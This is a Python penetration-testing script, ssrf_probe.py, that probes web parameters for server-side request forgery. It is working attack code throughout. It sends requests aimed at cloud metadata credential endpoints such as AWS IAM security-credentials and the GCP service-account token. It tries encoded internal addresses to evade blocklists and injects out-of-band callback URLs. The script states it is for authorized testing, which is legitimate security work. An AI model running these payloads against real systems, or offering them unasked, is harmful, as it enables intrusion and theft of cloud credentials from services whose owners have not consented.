#!/usr/bin/env python3
"""ssrf_probe.py — owned SSRF candidate detector for pen_test.

Any parameter that makes the SERVER fetch a URL (image proxies, webhooks,
url= / redirect= / callback= / feed= params, PDF/screenshot renderers,
import-from-URL) is an SSRF candidate. This tool exercises it three ways:

  1. in-band  — point the param at internal/metadata targets and look for the
     fetched content or a tell-tale error coming BACK in the response
     (reflected SSRF: the strongest no-setup signal)
  2. filter-bypass — the same internal target expressed many ways
     (127.1, 0x7f000001, [::1], decimal, @-tricks) to defeat naive blocklists
  3. out-of-band — inject a --callback URL (Burp Collaborator / interactsh /
     your own logger) so BLIND SSRF still proves itself: if the server hits
     your callback, it fetched an attacker-controlled URL. This is the only
     way to confirm blind SSRF, so wire a callback for any serious test.

Cloud metadata payloads (AWS IMDSv1/v2, GCP, Azure, DigitalOcean, Alibaba)
are built in — reaching these from SSRF is typically a direct path to cloud
credentials, so they are the highest-value confirmation.

AUTHORIZATION: sends live requests, and can make the target reach internal
hosts. Authorized targets only.

Usage:
    python3 ssrf_probe.py -u "https://app/fetch?url=X" --param url
    python3 ssrf_probe.py -u "https://app/proxy" -X POST --location json \\
        --param target --json '{"target":"x"}' --callback http://abc.oast.fun
"""

from __future__ import annotations

import argparse
import json as jsonlib

import _httpcore as core

# (label, url, body-signature that proves the fetch came back reflected)
METADATA_TARGETS = [
    ("AWS IMDS role list", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AccessKeyId"),
    ("AWS IMDS instance-id", "http://169.254.169.254/latest/meta-data/instance-id", "i-"),
    ("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "access_token"),
    ("Azure IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"),
    ("DigitalOcean", "http://169.254.169.254/metadata/v1.json", "droplet_id"),
    ("Alibaba", "http://100.100.100.200/latest/meta-data/", "instance-id"),
]

# Internal-target representations to defeat naive host blocklists.
def bypass_forms(host: str = "169.254.169.254", path: str = "/latest/meta-data/") -> list[tuple[str, str]]:
    return [
        ("dotted", f"http://{host}{path}"),
        ("localhost", f"http://localhost{path}"),
        ("127.0.0.1", f"http://127.0.0.1{path}"),
        ("127.1 short", f"http://127.1{path}"),
        ("0.0.0.0", f"http://0.0.0.0{path}"),
        ("ipv6 loopback", f"http://[::1]{path}"),
        ("decimal IP", f"http://2130706433{path}"),          # 127.0.0.1
        ("hex IP", f"http://0x7f000001{path}"),               # 127.0.0.1
        ("octal IP", f"http://0177.0.0.1{path}"),
        ("@-trick", f"http://expected-host.com@{host}{path}"),
        ("enclosed-alnum", f"http://①②⑦.0.0.1{path}"),      # some parsers normalize
    ]


def _spec(args) -> core.RequestSpec:
    base_json = jsonlib.loads(args.json) if args.json else None
    base_form = dict(core.parse_kv(args.data.split("&"), "=")) if args.data else {}
    return core.RequestSpec(method=args.method, url=args.url, param=args.param,
                            location=args.location, base_json=base_json, base_form=base_form)


def run_metadata(client: core.Client, spec: core.RequestSpec) -> list[str]:
    print("\n[in-band metadata] looking for fetched cloud-metadata content in the response...")
    hits = []
    for label, url, sig in METADATA_TARGETS:
        r = client.request(**spec.build(url))
        got = r.ok and sig in r.text
        note = "REFLECTED METADATA" if got else f"status={r.status} len={r.length}"
        print(f"  {label:26s} {note}")
        if got:
            hits.append(label)
    if hits:
        print(f"  [!] SSRF CONFIRMED (reflected) -> {', '.join(hits)} — cloud creds likely reachable.")
    return hits


def run_bypass(client: core.Client, spec: core.RequestSpec) -> list[str]:
    print("\n[filter bypass] internal target via multiple encodings...")
    baseline = client.request(**spec.build("http://this-host-should-not-resolve.invalid/"))
    working = []
    for label, url in bypass_forms():
        r = client.request(**spec.build(url))
        # signal: differs from the 'blocked/invalid' baseline, or returns metadata marker
        differs = r.ok and (r.signature() != baseline.signature())
        flag = "DIFFERENT (possible fetch)" if differs else "same as blocked baseline"
        if r.ok and "AccessKeyId" in r.text:
            flag = "REFLECTED METADATA"
        print(f"  {label:16s} {url:52s} status={r.status} {flag}")
        if differs:
            working.append(label)
    return working


def run_oob(client: core.Client, spec: core.RequestSpec, callback: str) -> None:
    print(f"\n[out-of-band] injecting callback {callback} (watch your collaborator/logger)...")
    for scheme_variant in (callback, callback.replace("http://", "https://")):
        r = client.request(**spec.build(scheme_variant))
        print(f"  sent {scheme_variant:40s} status={r.status} len={r.length}")
    print("  [i] BLIND SSRF is confirmed ONLY if your callback host recorded an inbound hit.")
    print("      No hit != safe — the server may allow-list schemes/hosts; try gopher:// and file:// too.")


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--param", required=True, help="the parameter that takes a URL/host")
    p.add_argument("--location", default="query", choices=core.LOCATIONS)
    p.add_argument("-X", "--method", default="GET")
    p.add_argument("--data"); p.add_argument("--json")
    p.add_argument("--callback", help="OOB URL (Burp Collaborator / interactsh / your logger)")
    p.add_argument("--skip-metadata", action="store_true")
    core.add_common_args(p)
    args = p.parse_args()
    core.require_scheme(args.url)
    client = core.client_from_args(args)
    spec = _spec(args)

    print(f"Target: {args.method} {args.url}  |  URL param `{args.param}` in {args.location}")
    confirmed = []
    if not args.skip_metadata:
        confirmed += run_metadata(client, spec)
    bypasses = run_bypass(client, spec)
    if args.callback:
        run_oob(client, spec, args.callback)

    print("\n" + "=" * 60)
    if confirmed:
        print(f"[!] SSRF CONFIRMED via reflected metadata: {', '.join(confirmed)} (CRITICAL).")
    elif bypasses:
        print(f"[?] SSRF CANDIDATE — these encodings behaved differently from a blocked target:")
        print(f"    {', '.join(bypasses)}. Confirm with an OOB callback (--callback) before reporting.")
    elif args.callback:
        print("[i] No reflected signal — check your OOB collaborator for a blind hit.")
    else:
        print("[-] No in-band SSRF signal. Re-run WITH --callback: blind SSRF is invisible in-band.")


if __name__ == "__main__":
    main()
